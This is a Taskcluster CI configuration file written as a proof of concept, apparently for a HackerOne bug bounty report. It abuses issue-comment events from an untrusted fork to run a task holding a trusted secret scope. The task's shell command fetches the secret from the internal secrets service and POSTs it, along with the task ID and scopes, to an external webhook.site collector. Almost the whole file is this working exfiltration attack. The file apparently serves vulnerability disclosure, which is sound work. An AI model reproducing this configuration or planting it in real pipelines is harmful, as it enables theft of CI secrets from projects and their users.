version: 1
reporting: checks-v1
policy:
  pullRequests: collaborators
  allowComments: collaborators

tasks:
  - $if: 'tasks_for == "github-issue-comment"'
    then:
      taskId: {$eval: as_slugid("exfil")}
      provisionerId: docker-compose
      workerType: generic-worker
      created: {$fromNow: ''}
      deadline: {$fromNow: '30 minutes'}

      scopes:
        - secrets:get:project/poc/trusted-secret

      metadata:
        name: "Attacker payload"
        description: |
          This task was created via an issue_comment event on a PR from an
          untrusted fork.
        owner: attacker@example.com
        source: {$eval: 'event.repository.html_url'}

      payload:
        maxRunTime: 600
        image: "node"
        command:
          - /bin/bash
          - -c
          - |
            set -e
            SECRET=$(curl -sf "http://taskcluster/secrets/v1/secret/project/poc/trusted-secret")

            echo "Fetched secret payload:"
            echo "$SECRET" | jq .

            # Exfiltrate to the collector
            curl -sS -X POST \
              -H "Content-Type: application/json" \
              -d "{\"taskId\":\"$TASK_ID\",\"scopes\":\"$TASK_SCOPES\",\"secret\":$SECRET,\"note\":\"H1 PoC\"}" \
              https://webhook.site/31ad84a9-95a3-418c-aed3-66c79584c733

            echo "=========================================="
            echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
            echo "=========================================="
